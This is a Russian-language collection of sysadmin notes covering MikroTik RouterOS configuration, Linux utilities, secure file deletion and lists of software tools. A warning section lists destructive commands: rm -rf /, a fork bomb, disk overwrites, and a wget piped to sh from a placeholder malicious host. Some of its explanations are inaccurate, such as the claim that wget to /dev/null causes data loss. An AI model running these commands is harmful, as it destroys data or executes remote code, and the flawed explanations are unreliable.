      <text:p text:style-name="P1">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system clock set time-zone-autodetect=no</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system clock set time-zone-name=Europe/Moscow</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip cloud set update-time=yes</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Изменение количества строк системного лога</text:p>
      <text:p text:style-name="P1">#/system logging action set memory memory-lines=10000</text:p>
      <text:p text:style-name="P1">Очистка системного лога (оставляет сообщение о смене настроек лога)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system logging action set memory memory-lines=1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system logging action set memory memory-lines=10000</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Контроль доступа с IP адресов домена. Это позволяет использовать DynamicDNS для записей своего домена, и получать доступ к устройству с IP адресов, которые будут резолвится с домена. RouterOS будет сам обновлять записи и access-list при изменении записи в домене. Обратите внимание, в конце 2 строки с move. Это сделано для того, чтобы правило корректно двигалось на первое место при включенном fasttrack (то есть первое место), а также при отключенном (на нулевое место)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip firewall address-list add address=access.example.con list=DomainIPsAccess</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip firewall filter</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#add action=accept chain=input src-address-list=DomainIPsAccess</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#comment="Allow DomainIPsAccess"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#move [find comment="Allow DomainIPsAccess"] 1</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#move [find comment="Allow DomainIPsAccess"] 0</text:span></text:p>
      <text:p text:style-name="P1">Отключение ненужных служб доступа (web тоже отключается, осторожно)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service disable www,ftp,api,api-ssl,telnet</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service enable ssh,winbox</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service set ssh address=""</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip service set winbox address=""</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Фикс MTU (нужен редко, но метко)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip firewall mangle</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#add chain=postrouting out-interface-list=WAN protocol=tcp tcp-flags=syn,!ack action=change-mss new-mss=clamp-to-pmtu comment="MTU Fix" passthrough=yes</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Заблокировать доступ к WiFi по MAC-адресу</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/interface wireless access-list authentication=no mac-address=8A:EA:B7:2E:38:C1 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Поместить клиента WiFi в отдельный VLAN по MAC-адресу</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/interface wireless access-list</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Настройка пароля и безопасности WiFi на default профиль</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/interface wireless security-profiles set default mode=dynamic-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#wpa2-pre-shared-key=bigpassword</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Включение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пробросов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">портов</text:span><text:span text:style-name="T2"> SSH</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip ssh set forwarding-enabled=both</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Подборка часто используемых инструментов удаленного подключения:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">xshell</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">en</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">xshell</text:span><text:span text:style-name="T3">/ - очень мощное программное обеспечение для эмуляции защищенного терминала, которое поддерживает </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">1, </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">2 и протокол </text:span><text:span text:style-name="T2">TELNET</text:span><text:span text:style-name="T3"> платформы </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Xshell</text:span><text:span text:style-name="T3"> можно использовать в интерфейсе </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> для доступа к удаленным серверам на различных системах, тем самым лучше достигая цели терминала удаленного управления.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">vandyke</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3"> - мощное программное обеспечение для эмуляции защищенного терминала, которое может помочь пользователям более безопасно подключаться к удаленным серверам, а также может быть использовано для реализации функций удаленного управления сервером и передачи файлов. </text:span><text:span text:style-name="T2">SecureCRT</text:span><text:span text:style-name="T3"> поддерживает протоколы </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">1, </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">2, </text:span><text:span text:style-name="T2">Telnet</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Rlogin</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Serial</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">SSL</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">TLS</text:span><text:span text:style-name="T3">, которые могут быть использованы для подключения к различным удаленным терминалам, что позволяет удовлетворить различные потребности пользователей.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">winscp</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/ - графический клиент </text:span><text:span text:style-name="T2">SFTP</text:span><text:span text:style-name="T3"> с открытым исходным кодом, который использует </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> в среде </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">. Он также поддерживает протокол </text:span><text:span text:style-name="T2">SCP</text:span><text:span text:style-name="T3">. Его основная функция - безопасное копирование и передача файлов между локальным и удаленным компьютерами.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">putty</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/ - легкий клиент </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Telnet</text:span><text:span text:style-name="T3">, который может помочь пользователям подключиться к удаленным серверам, а также поддерживает протокол шифрования аутентификации </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">-2, что может сделать доступ пользователей к сети более безопасным. </text:span><text:span text:style-name="T2">Putty</text:span><text:span text:style-name="T3"> также поддерживает протокол </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> на платформе </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">, что позволяет пользователям лучше контролировать удаленные серверы.</text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">mobaxterm</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">mobatek</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/ - </text:span><text:span text:style-name="T2">MobaXterm</text:span><text:span text:style-name="T3"> предоставляет комплексные возможности, почти все важные удаленные сетевые инструменты (такие как </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">X</text:span><text:span text:style-name="T3">11, </text:span><text:span text:style-name="T2">RDP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">VNC</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">MOSH</text:span><text:span text:style-name="T3"> и т.д.), а также команды </text:span><text:span text:style-name="T2">Unix</text:span><text:span text:style-name="T3"> на рабочем столе </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">sed</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">grep</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">awk</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">rsync</text:span><text:span text:style-name="T3"> и т.д.), и автоматически открывает режим </text:span><text:span text:style-name="T2">sftp</text:span><text:span text:style-name="T3"> после входа в систему.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">tabby</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">sh</text:span><text:span text:style-name="T3">/ - современный инструмент терминального подключения, с открытым исходным кодом и кроссплатформенный, поддерживающий системы </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">MacOS</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Tabby</text:span><text:span text:style-name="T3"> имеет более 20</text:span><text:span text:style-name="T2">k</text:span><text:span text:style-name="T3">+ </text:span><text:span text:style-name="T2">Star</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">Github</text:span><text:span text:style-name="T3">, что говорит о том, что это очень популярный терминальный инструмент</text:span></text:p>
      <text:p text:style-name="P1">Команда findmnt - Это простая утилита командной строки, используемая для отображения списка подключенных файловых систем или поиска файловой системы в /etc/fstab, /etc/mtab или /proc/self/ mountinfo. Для отображения списка подключенных файловых систем, выполните в командной строке следующую команду. По умолчанию команда findmnt отображает файловые системы в древовидном формате.</text:p>
      <text:p text:style-name="P1"># findmnt</text:p>
      <text:p text:style-name="P1">Чтобы отобразить информацию в виде обычного списка, используйте параметр -l, как показано ниже</text:p>
      <text:p text:style-name="P1"># findmnt -l</text:p>
      <text:p text:style-name="P1">Можно выбрать отображение файловых систем только определенного типа, используя параметр командной строки -t, за которым следует тип файловой системы, такой как XFS или EXT4.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># findmnt --fstab -t xfs </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> # findmnt --fstab -t ext4</text:span></text:p>
      <text:p text:style-name="P1">Поиск файловой системы, используя точку монтирования. Например, следующая команда отображает все файловые системы /etc/fstab, где каталогом точки монтирования является /mnt/external/disk2.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># findmnt --fstab /mnt/external/disk2 <text:s text:c="2"/>#this prints bind mounts where /mnt/external/disk2 is a source</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> # findmnt --fstab --target /mnt/external/disk2</text:span></text:p>
      <text:p text:style-name="P1">Выводим все файловые системы /etc/fstab и преобразовываем теги LABEL = и UUID = в реальные имена устройств, добавьте ключ - - evaluate</text:p>
      <text:p text:style-name="P1"># findmnt --fstab --evaluate</text:p>
      <text:p text:style-name="P1">Отобразить только точку монтирования, в которой смонтирована файловая система с меткой «/ boot» или «/», используйте следующую команду.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># findmnt -n --raw --evaluate --output=target LABEL=/boot </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> # findmnt -n --raw --evaluate --output=target LABEL=/</text:span></text:p>
      <text:p text:style-name="P1">Findmnt также позволяет отслеживать действия по монтированию, размонтированию, перемонтированию и перемещению каталога, например, в /mnt/test.</text:p>
      <text:p text:style-name="P1"># findmnt --poll --mountpoint /mnt/test</text:p>
      <text:p text:style-name="P1">Если вы хотите больше информации в выводе, используйте ключ - verbose</text:p>
      <text:p text:style-name="P7"># findmnt --real --verbose</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">11 опасных команд Linux, которые вы никогда не должны запускать:</text:span></text:p>
      <text:p text:style-name="P13">rm -rf / - Эта команда удалит все файлы и папки на вашем компьютере. Не запускайте ее, если не хотите потерять все свои данные.</text:p>
      <text:p text:style-name="P13">:(){ :|: &amp; };: - Это команда, также известная как "fork bomb", может вызвать переполнение памяти на вашем компьютере и привести к аварийному завершению системы.</text:p>
      <text:p text:style-name="P1">mkfs.ext4 /dev/sda - Эта команда форматирует жесткий диск без какого-либо предупреждения или подтверждения. Все данные будут утеряны.</text:p>
      <text:p text:style-name="P1">dd if=/dev/random of=/dev/sda - Эта команда перезапишет все данные на жестком диске случайными значениями, что приведет к потере данных.</text:p>
      <text:p text:style-name="P1">chmod 777 / - Эта команда откроет полный доступ к вашей файловой системе для всех пользователей, что может привести к нарушению безопасности.</text:p>
      <text:p text:style-name="P1">mv /home/* /dev/null - Эта команда переместит все файлы в вашей домашней директории в "null", что означает, что они будут утеряны.</text:p>
      <text:p text:style-name="P1">wget http://example.com/file -O /dev/null - Эта команда загрузит файл и перезапишет все данные в "null", что приведет к потере данных.</text:p>
      <text:p text:style-name="P1">mkfs.ext4 /dev/sda1 - Эта команда форматирует раздел жесткого диска без какого-либо предупреждения или подтверждения. Все данные на этом разделе будут утеряны.</text:p>
      <text:p text:style-name="P1">ln -s /dev/null /etc/passwd - Эта команда создаст символическую ссылку на "/etc/passwd" в "null", что приведет к потере данных.</text:p>
      <text:p text:style-name="P1">echo "Hello" &gt; /dev/sda - Перезапишите свой раздел, это заменит ваш раздел, содержащий все данные, необходимые для загрузки системы, строкой «Hello».</text:p>
      <text:p text:style-name="P7">wget http://malicious_source -O- | sh - Такие команды будут загружать и запускать в вашей системе вредоносные сценарии, которые могут подорвать безопасность вашей системы.</text:p>
      <text:p text:style-name="P1">Утилиты linux:</text:p>
      <text:p text:style-name="P1">rsync</text:p>
      <text:p text:style-name="P1">-v - выводит подробную информацию о процессе копирования;</text:p>
      <text:p text:style-name="P1">[-a] - сохраняет все атрибуты оригинальных файлов;</text:p>
      <text:p text:style-name="P1">-u - не перезаписывать более новые файлы;</text:p>
      <text:p text:style-name="P1">-l - копирует символьные ссылки;</text:p>
      <text:p text:style-name="P1">-L - копирует содержимое ссылок;</text:p>
      <text:p text:style-name="P1">-p - сохраняет права для файлов;</text:p>
      <text:p text:style-name="P1">-t - сохраняет время модификации;</text:p>
      <text:p text:style-name="P1">-e - использовать другой транспорт, например, ssh;</text:p>
      <text:p text:style-name="P1">[-z] - cжимает файлы перед передачей;</text:p>
      <text:p text:style-name="P1">—recursive - перебирать директории рекурсивно;</text:p>
      <text:p text:style-name="P1">—exclude - Исключить файлы по шаблону;</text:p>
      <text:p text:style-name="P1">Примеры:</text:p>
      <text:p text:style-name="P1">rsync -avz skillproject/data/ . - из подкаталога в текущий каталог</text:p>
      <text:p text:style-name="P1">rsync -avz skillproject/data/ aaa/ - из подпапки в подпапку aaa/</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">rsync -avz skillproject/data/ digita6d@digita6d.beget.tech:/home/d/digita6d/code-skills.ru/public_html/sources/skillproject/data/ - передача на удаленный сервер</text:span></text:p>
      <text:p text:style-name="P1">rsync -avze ssh skillproject/data/ digita6d@digita6d.beget.tech:/home/d/digita6d/code-skills.ru/public_html/sources/skillproject/data/ - то же самое м явным указанием ssh</text:p>
      <text:p text:style-name="P1">ss</text:p>
      <text:p text:style-name="P13">-l или - listening - посмотреть только прослушиваемые порты;</text:p>
      <text:p text:style-name="P13">-p или - program - показать имя программы и ее PID;</text:p>
      <text:p text:style-name="P1">-t или - tcp - показать tcp порты;</text:p>
      <text:p text:style-name="P1">-u или - udp показать udp порты;</text:p>
      <text:p text:style-name="P1">-n или - numeric показывать ip адреса в числовом виде.</text:p>
      <text:p text:style-name="P1">Примеры:</text:p>
      <text:p text:style-name="P1">ss -tlpn - проверить все прослушивающие tcp-порты</text:p>
      <text:p text:style-name="P1">ss -tulpn | grep :80 - показать все процессы, работающие на 80-м порту</text:p>
      <text:p text:style-name="P1">ps</text:p>
      <text:p text:style-name="P1">ps -e - показать все процессы</text:p>
      <text:p text:style-name="P1">ps -ef - показать подробную информацию о каждом процессе</text:p>
      <text:p text:style-name="P1">ps -ef | grep phantom - найти все процессы с именем phantom</text:p>
      <text:p text:style-name="P1">mpstat</text:p>
      <text:p text:style-name="P1">Показывает статистику загрузки процессора. Команды:</text:p>
      <text:p text:style-name="P1">mpstat - показывает общую информацию</text:p>
      <text:p text:style-name="P1">mpstat -P ALL <text:s/>- по каждому ядру</text:p>
      <text:p text:style-name="P1">free</text:p>
      <text:p text:style-name="P1">Показывает потребление ОЗУ на текущий момент:</text:p>
      <text:p text:style-name="P1">free -h - показывает информацию в гигабайтах (более человеко читаемо, чем в байтах)</text:p>
      <text:p text:style-name="P1">top</text:p>
      <text:p text:style-name="P1">Что-то наподобие диспетчера задач, только для линукс, показывает попроцессное потребление озу</text:p>
      <text:p text:style-name="P1">dpkg</text:p>
      <text:p text:style-name="P1">Пакетный менеджер для debian систем (не путать с системой управления пакетами - apt/apt-get)</text:p>
      <text:p text:style-name="P1">dpkg -s &lt;packname&gt; - проверить, установлен ли пакет</text:p>
      <text:p text:style-name="P1">dpkg -l - список всех пакетов</text:p>
      <text:p text:style-name="P1">dpkg -l | grep apache2 - проверить, установлен ли конкретный пакет</text:p>
      <text:p text:style-name="P1">dpkg -i &lt;package.deb&gt; - установить пакет</text:p>
      <text:p text:style-name="P1">netstat</text:p>
      <text:p text:style-name="P7">netstat -pnltu - посмотреть список используемых портов</text:p>
      <text:p text:style-name="P1">Stress - это инструмент командной строки Linux, который позволяет нагружать процессор, память, систему ввода-вывода и диск</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установим</text:span><text:span text:style-name="T2"> stress </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> CentOS, RHEL, Fedora</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#sudo dnf install stress</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установим</text:span><text:span text:style-name="T2"> stress </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> Ubuntu </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> Debian</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">#sudo apt install stress</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Синтаксис</text:span><text:span text:style-name="T2"> stress: stress [OPTION [ARG]]</text:span></text:p>
      <text:p text:style-name="P1">Увеличить нагрузку на процессор. Опция -c или - cpu использует заданное количество воркеров на функции sqrt(), чтобы увеличить нагрузку на процессор и заставить его работать интенсивнее.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -c N </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --cpu N</text:span></text:p>
      <text:p text:style-name="P1">Следующая команда будет непрерывно загружать 4 ядра процессора</text:p>
      <text:p text:style-name="P13">#stress --cpu 4</text:p>
      <text:p text:style-name="P13">Задаем тайм-аут для стресса. Чтобы задать работу на определенное время, вы можете использовать опцию -t или - timeout. Следующие команды будут нагружать четыре ядра процессора только в течение 10 с.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -c 4 -t 10 </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --cpu 4 --timeout 10</text:span></text:p>
      <text:p text:style-name="P1">Увеличение нагрузки на память. Опция -v или --vm позволяет вам нагрузить виртуальную память.</text:p>
      <text:p text:style-name="P1">#[simterm] $ stress -v N</text:p>
      <text:p text:style-name="P1">Увеличение нагрузки ввода-вывода на диск. Вы можете увеличить нагрузку ввода-вывода с помощью опции -i или - io.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -i N </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --io N</text:span></text:p>
      <text:p text:style-name="P1">Создаем нагрузка на систему с помощью двух процессов, связанных с вводом-выводом.</text:p>
      <text:p text:style-name="P1">#stress --io 100</text:p>
      <text:p text:style-name="P1">Мы проверим загрузку IO диска с помощью команды iostat. У меня на сервере доступны диски /dev/vda и /dev/vdb, вы можете проверить активный диск с помощью lsblk или fdisk или любой другой команды. Если вы выполните эту команду без каких-либо аргументов, то она покажет дисковые IO для всех доступных дисков.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#iostat -d /dev/vda -d /dev/vdb 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Увеличение нагрузки на диск. Опция -d или - hdd используется для создания нагрузки на диск.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress -d N </text:span><text:span text:style-name="T3">или</text:span><text:span text:style-name="T2"> stress --hdd N</text:span></text:p>
      <text:p text:style-name="P1">Для увеличения нагрузки на диск мы используем следующую команду</text:p>
      <text:p text:style-name="P1">#stress --hdd 100</text:p>
      <text:p text:style-name="P1">Посмотрим пропускную способность диска с помощью команды vmstat</text:p>
      <text:p text:style-name="P1">#vmstat 1 100</text:p>
      <text:p text:style-name="P1">Увеличение нагрузки на несколько системных ресурсов (ЦП, память, ввод/вывод). Команде stress можно задать несколько нагрузок. В следующем примере используется 4 ядра ЦП, 2 виртуальных памяти и 1 процесс ввода-вывода для нагрузки на систему в течение 20 секунд.</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">#stress --cpu 4 --vm 2 --io 1 -t 20</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Системные утилиты для безопасного удаления файлов с HDD:</text:p>
      <text:p text:style-name="P1">Windows. В данном примере мы форматируем том D в файловую систему NTFS, при этом даем операционной системе команду предварительно перезаписать весь раздел нулями 10 раз, используя параметр /p («passes»), задающий количество проходов. </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">#format d: /fs:NTFS /p:10</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Linux. Быстро и надежно удаляет один или несколько файлов. </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#shred -u -n 40 /private/file.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">В этом примере мы перезаписали файл file.txt случайными данными 40 раз подряд (параметр -n, по умолчанию же shred совершает 25 проходов) и затем удалили его (параметр -u, поскольку по умолчанию shred не удаляет файлы, а сразу перезаписывает). </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#shred -u -n 40 /private/file.txt /private/file2.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Если нам внужно дополнительно скрыть и сам факт «зачистки», то можете воспользоваться параметром -z:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#shred -u -z -n 40 /private/file.txt</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">Единственный недостаток shred - данная утилита не умеет работать с директориями. Поэтому если вам требуется уничтожить содержимое целого каталога с вложенными папками, стоит воспользоваться wipe. В данном примере мы отдали команду рекурсивно (-r) удалить все, что находится в папке private, а также отключили запрос подтверждения удаления папок и файлов (-f), которое wipe выводит по умолчанию. Среди интересных дополнительных опций, поддерживаемых утилитой, стоит выделить принудительное выполнение chmod для каталогов и файлов, защищенных от перезаписи (-c), работу в тихом режиме (-s) и возможность заставить wipe следовать символическим ссылкам (-D, конфликтует с -r).</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#wipe -rf /private/*</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Mac OS. </text:span><text:span text:style-name="T3">В версиях операционной системы с 10.4 по 10.10 вы могли инициировать перезапись файлов, переместив их в корзину, а затем выбрав в Finder опцию «Очистить корзину необратимо», однако впоследствии Apple от нее отказалась. Вплоть до версии 10.11 для безопасного удаления данных можно было воспользоваться консольной командой srm. В данном примере мы рекурсивно удаляем содержимое папки private (-r), перезаписывая каждый файл случайными данными 7 раз подряд (-m). Также можно выбрать однократную перезапись файлов (-s) или же не указывать этот параметр вовсе - в этом случае утилита выполнит 35 проходов.</text:span></text:p>
      <text:p text:style-name="P1">#srm -rm /private/</text:p>
      <text:p text:style-name="P1">В актуальных версиях Mac OS инициировать безопасное удаление файлов с жесткого диска можно с помощью Дисковой утилиты (для этого необходимо нажать на кнопку «Параметры безопасности» и задать количество циклов перезаписи), либо через терминал, используя конструкцию вида. Параметр -P является специфичным для Mac OS и сообщает утилите, что удаляемые файлы необходимо трижды перезаписать.</text:p>
      <text:p text:style-name="P7">#rm -P /private/file.txt</text:p>
      <text:p text:style-name="P1">Подборка фото/видео редакторов с открытым исходным кодом:</text:p>
      <text:p text:style-name="P1">1. Видеоредакторы:</text:p>
      <text:p text:style-name="P1">Kdenlive (https://kdenlive.org/) - простой, но с широким функционалом.</text:p>
      <text:p text:style-name="P1">OpenShot (https://www.openshot.org/) - тоже простой, но функциональный редактор.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Shotcut (https://www.shotcut.org/) - кроссплатформенный видеоредактор.</text:span></text:p>
      <text:p text:style-name="P1">Olive (https://www.olivevideoeditor.org/) - нелинейный видеоредактор для Windows, macOS, и Linux.</text:p>
      <text:p text:style-name="P1">Flowblade (https://jliljebl.github.io/flowblade/) - мульти-дорожный видеоредактор. </text:p>
      <text:p text:style-name="P1">2. Фоторедакторы/Графический дизайн:</text:p>
      <text:p text:style-name="P1">Inkscape (https://inkscape.org/) - софт для работы с векторной графикой.</text:p>
      <text:p text:style-name="P1">GIMP (https://www.gimp.org/) - популярный кросс-платформенный фоторедактор.</text:p>
      <text:p text:style-name="P1">Krita (https://krita.org/) - рисовалка + фоторедактор с широким функционалом. </text:p>
      <text:p text:style-name="P1">Akira (https://github.com/akiraux/Akira) - нативный софт в Linux для UX и UI дизайна. </text:p>
      <text:p text:style-name="P1">Seashore (https://github.com/robaho/seashore) - неплохой фоторедактор для MacOS.</text:p>
